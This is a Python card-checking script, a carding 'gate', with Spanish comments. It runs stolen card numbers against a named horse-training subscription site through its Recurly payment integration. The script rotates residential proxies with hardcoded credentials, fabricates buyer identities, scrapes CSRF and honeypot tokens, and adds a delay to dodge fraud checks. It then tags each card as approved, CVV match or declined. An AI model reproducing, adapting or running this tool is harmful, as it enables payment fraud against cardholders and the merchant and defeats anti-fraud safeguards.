import re
import json
import random
import string
import asyncio
from curl_cffi import requests
from colorama import Fore

# --- CONFIGURACIÓN TÉCNICA ---
TARGET_URL = "https://dnc.dressagenaturally.net/subscribe-yearly"
RECURLY_TOKEN_URL = "https://api.recurly.com/js/v1/token"
RECURLY_PUBLIC_KEY = "ewr1-hjrg1yUOdvugEqsEEK1qF9"
RECURLY_VERSION = "4.43.0"

class DressageGate:
    def __init__(self, cc_data):
        p = cc_data.split('|')
        self.cc, self.mm, self.aa, self.cvv = p[0], str(int(p[1])), p[2], p[3]
        
        # Credenciales Base de IPRoyal
        self.proxy_user = "o1CK8doqxzS9ENdO"
        self.proxy_pass = "ewwKtN9UnwgSnWnV_country-us"
        
        # Generación de Identidad
        nombres = ["James", "Robert", "John", "Michael", "David", "William"]
        apellidos = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.first_name = random.choice(nombres)
        self.last_name = random.choice(apellidos)
        self.rand_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        self.username = f"{self.first_name.lower()}_{self.rand_id}"
        self.email = f"{self.username}@{random.choice(['gmail.com', 'outlook.com', 'yahoo.com'])}"
        self.password = f"{random.choice(string.ascii_uppercase)}{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(100, 999)}!"

        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        
        # Iniciamos la primera sesión
        self.rotate_proxy_session()

    def rotate_proxy_session(self):
        """Genera una nueva IP mediante una sesión distinta de IPRoyal"""
        session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        proxy_url = f"http://{self.proxy_user}:{self.proxy_pass}_session-{session_id}@geo.iproyal.com:12321"
        self.session = requests.Session(impersonate="chrome124", proxies={"http": proxy_url, "https": proxy_url})

    def _gen_recurly_id(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    async def run(self):
        try:
            # --- PASO 1: CAPTURA DE TOKENS (BUCLE DE REINTENTO) ---
            joomla_csrf = None
            extra_token_name = None
            extra_token_val = None
            honeypot = None

            print(f"{Fore.CYAN}🔗 [1/4] Obteniendo tokens dinámicos (Auto-Retry)...")
            
            while True:
                try:
                    res = self.session.get(TARGET_URL, timeout=30)
                    html = res.text

                    j_token = re.search(r'name=["\']([a-f0-9]{32})["\']\s+value=["\']1["\']', html)
                    e_token = re.search(r'name=["\']([a-f0-9]{32})["\']\s+value=["\'](\d+\.\d+)["\']', html)
                    
                    if j_token and e_token:
                        joomla_csrf = j_token.group(1)
                        extra_token_name = e_token.group(1)
                        extra_token_val = e_token.group(2)
                        hp_match = re.search(r'input type="text" name="(.*?)" value=""/><input type="hidden"', html)
                        honeypot = hp_match.group(1) if hp_match else "your_name_here"
                        break # Salimos del bucle porque ya los tenemos
                except Exception:
                    pass
                
                print(f"{Fore.YELLOW}   ↳ Tokens no hallados. Rotando IP y reintentando...")
                self.rotate_proxy_session()
                await asyncio.sleep(1)

            # --- PASO 2: TOKENIZACIÓN RECURLY ---
            print(f"{Fore.CYAN}💳 [2/4] Tokenizando en Recurly...")
            recurly_payload = {
                "first_name": self.first_name, "last_name": self.last_name,
                "address1": f"{random.randint(100, 999)} Broadway Ave",
                "country": "US", "state": "NY", "city": "New York", "postal_code": "10001",
                "number": self.cc, "month": self.mm, "year": self.aa, "cvv": self.cvv,
                "key": RECURLY_PUBLIC_KEY, "version": RECURLY_VERSION,
                "deviceId": self._gen_recurly_id(), "sessionId": self._gen_recurly_id(), "instanceId": self._gen_recurly_id(),
                "browser[user_agent]": self.ua
            }
            
            res_rec = self.session.post(RECURLY_TOKEN_URL, data=recurly_payload, timeout=30)
            res_rec_text = res_rec.text
            if "(" in res_rec_text: res_rec_text = res_rec_text[res_rec_text.find("(")+1 : res_rec_text.rfind(")")]
            
            data_rec = json.loads(res_rec_text)
            if "id" not in data_rec: return "#DECLINED", data_rec.get('error', {}).get('message', 'Recurly Error')
            recurly_token = data_rec["id"]

            # --- PASO 3: PAGO FINAL ---
            print(f"{Fore.CYAN}🚀 [3/4] Enviando transacción final...")
            await asyncio.sleep(random.uniform(1.5, 3.0)) # Delay humano para evitar fraud-check
            
            final_payload = {
                "firstname": self.first_name, "lastname": self.last_name, "username": self.username,
                "email": self.email, "password": self.password, "password2": self.password,
                "planCodes": "yearly", "payment_method": "cc", "billing[token]": recurly_token,
                "task": "subscription.create", "option": "com_simplerenew",
                honeypot: "", joomla_csrf: "1", extra_token_name: extra_token_val
            }
            
            res_final = self.session.post(TARGET_URL, data=final_payload, timeout=60)
            final_html = res_final.text

            # --- PASO 4: ANÁLISIS ---
            alert_match = re.search(r'class=["\'].*?alert-message.*?["\']>(.*?)</div>', final_html, re.DOTALL | re.IGNORECASE)
            if not alert_match: alert_match = re.search(r'class=["\']alert alert-danger.*?["\']>(.*?)</div>', final_html, re.DOTALL | re.IGNORECASE)

            if alert_match:
                msg = re.sub('<[^<]+?>', '', alert_match.group(1)).strip()
                msg_lower = msg.lower()
                
                # CORRECCIÓN DE RESPUESTA CVV SEGÚN TU SOLICITUD
                if "security code" in msg_lower or "cvv" in msg_lower:
                    return "#CVV_MATCH", msg
                
                tag = "#DECLINED"
                if "insufficient funds" in msg_lower: tag = "#INSUFFICIENT_FUNDS"
                return tag, msg
            
            if "thank you" in final_html.lower() or "success" in final_html.lower():
                return "#APPROVED", "Transaction Successful"
            
            return "#UNKNOWN", "Indeterminate Response"

        except Exception as e:
            return "#ERROR", str(e)[:50]